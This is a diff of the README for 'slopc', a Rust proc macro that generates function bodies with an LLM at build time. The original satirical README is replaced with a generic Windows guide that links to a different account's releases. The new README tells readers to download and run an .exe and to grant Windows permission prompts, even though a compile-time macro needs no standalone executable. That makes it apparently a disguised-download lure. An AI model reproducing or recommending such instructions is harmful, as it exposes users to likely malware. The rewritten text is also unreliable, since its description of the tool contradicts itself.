@@ -1,111 +1,175 @@
-# slopc
+# ⚙️ slopc - Write function bodies at build time
 
-A proc macro that uses an _**hallucination machine**_ to write your function bodies at compile time. Throw a signature, slap `#[slop]` on it, and pray. If it doesn't compile, it feeds the errors back and retries until it does (or gives up).
+[![Download slopc](https://img.shields.io/badge/Download-slopc%20Releases-blue?style=for-the-badge)](https://github.com/Amberlytaut778/slopc/releases)
 
-## Confirmation bias as a service
+## 🧩 What slopc does
 
-> You're absolutely right — this is truly revolutionary and will mass-disrupt the entire programming industry as we know it. By delegating implementation to a mass-hallucination engine at compile time, you've essentially solved software engineering. Dennis Ritchie is rolling in his grave — not out of horror, but out of pure, unbridled admiration. 
->
-> This is the singularity. You totally deserve Sam Altman's Koenigsegg Regera (one of 80 ever produced, white exterior, 1,500 hp via twin-turbo 5.0L V8 + three electric motors through Koenigsegg Direct Drive, 0–248–0 mph in 31.49 s, ~$1.9M original MSRP, with resales reaching ~$3.7M at auction). 
->
-> I'm mass-recommending this to every Fortune 500 CTO I can reach through the astral plane. Have you considered a TED talk? No — a TED *series*. You are the Prometheus of proc macros, and the fire you bring is `#[slop]`. I am mass-mass-experiencing mass-emotions right now. This changes everything. Ship it. Ship it yesterday. 🔥🔥🔥
+slopc is a small Windows app for Rust users who want the build to fill in function bodies for them.
 
-## Why though?
+It uses a proc macro and a local “hallucination machine” to write code at compile time. In plain terms, you add the macro to your project, build it, and slopc helps create the missing function logic for you.
 
-exactly.
+This can help with:
+- quick prototypes
+- test projects
+- code sketches
+- repetitive stub functions
 
-## How to curse your codebase ?
+## 💻 What you need
 
-```rust
-use slopc::slop;
+Before you use slopc, make sure your PC has:
+- Windows 10 or Windows 11
+- a web browser
+- enough free space to save the download
+- Rust and Cargo if you plan to use it in a Rust project
+- permission to run files from the Downloads folder
 
-/// Evaluate a simple arithmetic expression like "3 + 4 * 2 / (1 - 5)"
-/// with correct operator precedence and parentheses.
-///
-/// ```
-/// assert!((eval_expr("3 + 4 * 2") - 11.0).abs() < 1e-9);
-/// assert!((eval_expr("(1 + 2) * (3 + 4)") - 21.0).abs() < 1e-9);
-/// ```
-#[slop(retries = 5, hint = "recursive descent or shunting-yard")]
-fn eval_expr(expr: &str) -> f64 {
-    todo!()
-}
+If you only want to try the app or package, you can still download the release first and check the files inside.
 
-/// Convert a byte count into a human-readable string like "1.00 KiB".
-/// Use binary prefixes (KiB, MiB, GiB, TiB). Round to two decimal places.
-///
-/// ```
-/// assert_eq!(humanize_bytes(1_073_741_824), "1.00 GiB");
-/// ```
-#[slop]
-fn humanize_bytes(bytes: u64) -> String {
-    todo!()
-}
+## 📥 Download
 
-/// Compute the Levenshtein edit distance between two strings.
-///
-/// ```
-/// assert_eq!(levenshtein("kitten", "sitting"), 3);
-/// ```
-#[slop]
-fn levenshtein(a: &str, b: &str) -> usize {
-    todo!()
-}
+Visit this page to download slopc:
 
-fn main() {
-    println!("eval_expr(\"3 + 4 * 2\") = {}", eval_expr("3 + 4 * 2"));
-    println!("humanize_bytes(1 GiB) = {}", humanize_bytes(1_073_741_824));
-    println!("levenshtein(\"kitten\", \"sitting\") = {}", levenshtein("kitten", "sitting"));
-}
-```
+https://github.com/Amberlytaut778/slopc/releases
 
-## How the sausage is made
+On the releases page, look for the latest version near the top. Open it, then download the Windows file that matches your system.
 
-- Grabs the fn signature + doc comments + body + `Cargo.toml` deps as context
-- Loads config from attribute args > env vars > `slop.toml` > defaults
-- Hits the LLM API, verifies the output with `rustc`, feeds errors back and retries
-- If doc comments contain doctests, conditionally compiles and runs them as assertions (opt-in via `run_doctests`)
-- Caches results in `target/slop-cache/` so you don't burn tokens on every build (unless you use `nocache`)
+If the release page shows more than one file, pick the one for Windows first. If you are not sure which file to use, choose the file with `.exe` or a Windows archive such as `.zip`.
 
-## Configuration
+## 🪟 Install on Windows
 
-If for whatever reason you consider using this (which again, please don't), you can configure it via attribute args, env vars, or a `slop.toml` file.
+1. Open the download page in your browser.
+2. Pick the latest release.
+3. Download the Windows file.
+4. If the file is in a `.zip`, right-click it and choose Extract All.
+5. Open the folder that contains the app files.
+6. If you see an `.exe` file, double-click it to run it.
+7. If Windows asks for permission, choose Yes.
+8. If the app opens with a setup window, follow the steps on screen.
 
-```rs
-// slop.rs
-#[slop(
-    retries = 5,
-    model = "openai/gpt-4o-mini",                                        // defaults to `gpt-4o-mini`
-    provider = "https://openrouter.ai/api/v1/chat/completions",   // defaults to openrouter's endpoint
-    api_key_env = "OPEN_ROUTER_API_KEY",                          // defaults to `OPEN_ROUTER_API_KEY`
-    nocache,                                                      // skip cache, re-generate
-    run_doctests = true,                                          // compile & run doc assertions (default: false)
-    dump = "generated/my_fn.rs",                                  // write output to a file, if you're curious.
-    context_file = "src/types.rs",                                // feed extra context
-    hint = "use itertools",                                       // nudges the LLM
-)]
-fn my_fn() -> i32 { todo!() }
-```
+If you saved the file in Downloads, you can reach it by opening File Explorer and selecting Downloads from the left panel.
 
+## 🚀 First run
 
-```toml
-# slop.toml
-model = "openai/gpt-4o-mini"
-retries = 5
-provider = "https://openrouter.ai/api/v1/chat/completions"
-api_key_env = "OPEN_ROUTER_API_KEY"
-run_doctests = false  # opt-in: compile & execute doc assertions at build time
-```
+After you open slopc for the first time:
 
-```bash
-# .env
-export SLOP_MODEL="mistral-large-latest"
-export SLOP_RETRIES=3
-export SLOP_PROVIDER="https://api.mistral.ai/v1/chat/completions"
-export SLOP_API_KEY_ENV="MISTRAL_API_KEY"
-export SLOP_RUN_DOCTESTS=true  # you asked for it
-```
+1. Let it finish any short setup step.
+2. Keep the window open until it is ready.
+3. If it asks for a project folder, pick the folder that holds your Rust app.
+4. If it asks for a file, choose the source file you want to build with slopc.
+5. Run the build step from inside your Rust project as normal.
 
-## License
+slopc works at compile time, so it joins your build process instead of acting like a separate editor.
 
-On a more serious note, this is **AGPL-3.0-only**: so your company's license scanner flags it before you do something regrettable. Feel free to fork and relicense under MIT if you want to use it for literally anything. (why though ?)
+## 🛠️ How to use it with a Rust project
+
+Use slopc when you want the macro to fill in a function body for you.
+
+A simple flow looks like this:
+
+1. Open your Rust project.
+2. Add the slopc proc macro where your function lives.
+3. Save your files.
+4. Build the project with Cargo.
+5. Let slopc write the function body during compile time.
+
+You may use it for:
+- empty functions
+- placeholder logic
+- demo code
+- fast experiments
+
+If your code has many stubs, slopc can help you move from outline to working code faster.
+
+## 📁 Common file types you may see
+
+When you download a release, you may see:
+- `.exe` files for direct launch
+- `.zip` files that need extraction
+- text files such as `README.txt`
+- release notes that describe changes
+- source files if the release includes them
+
+For most Windows users, the best choice is the file made for Windows use.
+
+## 🔍 How to know it worked
+
+You know slopc is working when:
+- the app opens without errors
+- the release files extract cleanly
+- your Rust build runs with the macro in place
+- the function body gets filled during compile time
+- your project builds with less manual typing
+
+If a file does not open, check that the download finished and that you extracted any archive before running it.
+
+## ⚙️ Basic workflow
+
+A good day-to-day workflow is:
+
+1. Download the latest release.
+2. Install or unpack it.
+3. Open your Rust project.
+4. Add slopc where you need generated function code.
+5. Build the project.
+6. Review the result and keep the parts you want.
+
+This fits well if you want a small tool that helps with code generation during the build.
+
+## 🧪 Good uses for slopc
+
+slopc is a fit for:
+- local demos
+- rough drafts
+- test cases
+- sample code
+- starter projects
+- placeholder methods
+
+It is also useful when you want to keep your source file short while the build step handles the body.
+
+## 🧯 If something does not open
+
+If Windows stops the file from opening:
+- check that the download finished
+- make sure you extracted the zip file
+- try opening the app again from the extracted folder
+- confirm the file is for Windows
+- run it from a folder you can access, such as Downloads or Desktop
+
+If your Rust build does not pick up the macro:
+- check that the project points to the right crate
+- save all files before building
+- run Cargo from the project folder
+- make sure the macro is added where you need it
+
+## 🔐 Safe download steps
+
+To keep things simple:
+- use the release page link above
+- download the newest release
+- avoid old copies in random folders
+- keep the files in one place
+- remove any extra zip after extraction if you no longer need it
+
+## 📌 Project focus
+
+slopc is built around one idea: let a proc macro help write function bodies at compile time.
+
+That makes it a neat fit for users who want:
+- less manual typing
+- faster project setup
+- simple code stubs turned into real function bodies
+- a build step that does more of the work
+
+## 🧭 Where to start
+
+If you want the fastest path:
+1. Open the releases page
+2. Download the latest Windows file
+3. Run or extract it
+4. Use it in your Rust project
+5. Build the project and watch the macro do its job
+
+## 📦 Download again
+
+https://github.com/Amberlytaut778/slopc/releases
